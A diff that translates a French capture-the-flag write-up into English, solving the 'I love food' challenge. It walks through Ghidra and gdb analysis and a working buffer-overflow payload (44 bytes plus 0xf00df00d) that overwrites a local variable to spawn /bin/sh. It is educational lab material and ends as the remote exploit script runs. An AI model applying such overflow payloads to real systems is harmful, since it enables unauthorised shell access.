@@ -1,6 +1,6 @@
 # I love food !
 
-Sujet :
+Subjet :
 
 ```md
 I made a program to know more about the tastes of the players, what's your favorite food ? :)
@@ -8,7 +8,7 @@ I made a program to know more about the tastes of the players, what's your favor
 http://internetcest.fun:13338
 ```
 
-[Cet exécutable](./i_love_food) est fournis. Essayons le :
+[This binary](./i_love_food) is given. Let's try it out :
 
 ```bash
 $ ./i_love_food 
@@ -17,11 +17,11 @@ test
 Interesting... Mine is DEADBEEF :) 
 ```
 
-Le programme demande une entrée de l'utilisateur, et s'arrête. Explorons le code.
+The program is asking for an input, and exiting. Let's explore the code.
 
-## Reverse
+## Static analysis
 
-Avec ghidra on obtient le code suivant :
+Using ghidra we can find those functions :
 
 ```C
 undefined8 main(void)
@@ -50,13 +50,13 @@ void vuln(void)
 }
 ```
 
-On veut exécuter la commande `system("/bin/sh");` dans la fonction vuln() pour obtenir un shell. Il faut donc valider la condition `if (local_c == 0xf00df00d)`.  
+We want to execute the command `system("/bin/sh");` in the vuln() function to get a shell. To do so we'll need to pass this condition : `if (local_c == 0xf00df00d)`. To achieve this, we'll modify the variable local_c by exploiting the gets() function which is vulnerable to a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow).
+
+## Dynamic analysis
+
+Let's find out how many bytes we need to write over before modifying local_c using gdb.  
   
-La fonction gets() utilisé pour récupérer l'entrée de l'utilisateur étant vulnérable à un buffer overflow, on comprend qu'il faut utiliser cette faille pour modifier la variable local_c.
-
-## Payload
-
-Utilisons gdb pour trouver notre payload :
+First, we'll add a breakpoint (gdb will stop everytime the program reaches the instruction) after the gets() function is called. To do so, we'll disasemble the vuln() function and look for the instruction calling gets() :
 
 ```gdb
 (gdb) disas vuln
@@ -93,6 +93,11 @@ Dump of assembler code for function vuln:
 End of assembler dump.
 (gdb) break *vuln+47
 Breakpoint 1 at 0x11c3
+```
+
+According to our static analysis, the variable used to store the user input is of 44 bytes : `char local_38 [44];`. Let's fill this variable by using python to print 44 characters (we'll use "\x41" which is an `A` in ascii), and then inspect the stack to see how many bytes we need to write over before writing over local_c :
+
+```gdb
 (gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44)')
 Starting program: /home/coucou/Documents/I_love_food/i_love_food <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44)')
 [Thread debugging using libthread_db enabled]
@@ -108,7 +113,8 @@ Breakpoint 1, 0x00005555555551c3 in vuln ()
 0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
 ```
 
-On lance gdb, ajoute un break après l'appel de la fonction gets, et rentre 44 charactères A pour remplir le buffer utilisé pour stocker l'entrée de l'utilisateur. En observant la stack on voit que la variable local_c contenant `deadbeef` est stocké directement après. Essayons de la modifier :
+The rsp (Resgister Stack Pointer) is a register that points to the top of the current stack. So by using the `x/20wx $rsp` instruction, we can inspect the current stack.  
+In the stack, we can easily spot the 44 "\x41" we gave to the program, and we can see a 0xdeadbe00 value right next to it. During our static analysis, we found `local_c = 0xdeadbeef;`, which means that the local_c variable is stored right after the user input. Let's write over it by adding "\x0d\xf0\x0d\xf0" (being on a [little endian system](https://en.wikipedia.org/wiki/Endianness) we write over memory in reverse), we need to write over memory  after our previous input :
 
 ```gdb
 (gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
@@ -124,7 +130,7 @@ Breakpoint 1, 0x00005555555551c3 in vuln ()
 0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0xf00df00d
 0x7fffffffda50:	0xffffda00	0x00007fff	0x5555522b	0x00005555
 0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
-(gdb) c
+(gdb) continue
 Continuing.
 Damn that's a good one !
 [Detaching after vfork from child process 4655]
@@ -133,7 +139,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000000000000 in ?? ()
 ```
 
-On arrive bien au message de succès. Testons le payload directement sur l'executable :
+We can see in the stack that the variable has been modified, and by resuming execution after the breakpoint the program does reach the success message and open another process. Let's test our payload on the binary using the intruction `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee)` to input our payload, and then freeze the shell before it closes :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
@@ -146,11 +152,11 @@ ls
 exploit.py  i_love_food  README.md
 ```
 
-Le programme lance bien /bin/sh, le payload final est donc `"\x41"*44+"\x0d\xf0\x0d\xf0"`.
+We succesfully opened a shell, so the final payload is : `"\x41"*44+"\x0d\xf0\x0d\xf0"`.
 
 ## Exploit
 
-Il faut maintenant se connecter au service et envoyer le payload. On utilise donc [ce script python](./exploit.py) qui permet de ce connecter au serveur, envoyer le payload, puis d'interagir avec le shell pour obtenir le flag :
+Now let's connect to the service and send our payload. To do so, we'll use [this script](./exploit.py) :
 
 ```bash
 $ python3 exploit.py                                                                              
